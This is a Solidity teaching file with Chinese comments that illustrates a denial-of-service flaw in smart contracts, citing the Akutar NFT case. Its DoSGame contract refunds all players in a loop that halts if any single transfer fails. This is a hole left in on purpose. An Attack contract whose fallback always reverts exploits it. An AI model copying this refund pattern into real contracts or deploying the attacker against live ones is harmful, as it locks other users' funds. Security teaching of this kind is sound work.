// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

/**
 * @title 拒绝服务（Denial of Service, DoS）漏洞
 * 在 Web2 中，拒绝服务攻击（DoS）是指通过向服务器发送大量垃圾信息或干扰信息的方式，
 * 导致服务器无法向正常用户提供服务的现象。
 * 而在 Web3，它指的是利用漏洞使得智能合约无法正常提供服务
 * 
 * 案例：NFT 项目 Akutar
 * @author
 * @notice
 */
// 有DoS漏洞的游戏，玩家们先存钱，游戏结束后，调用deposit退钱。
contract DoSGame {
    bool public refundFinished;
    mapping(address => uint256) public balanceOf;
    address[] public players;

    // 所有玩家存ETH到合约里
    function deposit() external payable {
        require(!refundFinished, "Game Over");
        require(msg.value > 0, "Please donate ETH");
        // 记录存款
        balanceOf[msg.sender] = msg.value;
        // 记录玩家地址
        players.push(msg.sender);
    }

    // 游戏结束，退款开始，所有玩家将依次收到退款
    function refund() external {
        require(!refundFinished, "Game Over");
        uint256 pLength = players.length;
        // 通过循环给所有玩家退款
        for (uint256 i; i < pLength; i++) {
            address player = players[i];
            uint256 refundETH = balanceOf[player];
            (bool success, ) = player.call{value: refundETH}("");
            require(success, "Refund Fail!");
            balanceOf[player] = 0;
        }
        refundFinished = true;
    }

    function balance() external view returns (uint256) {
        return address(this).balance;
    }
}

contract Attack {
    // 退款时进行DoS攻击
    fallback() external payable {
        revert("DoS Attack!");
    }

    // 参与DoS游戏并存款
    function attack(address gameAddr) external payable {
        DoSGame dos = DoSGame(gameAddr);
        dos.deposit{value: msg.value}();
    }
}
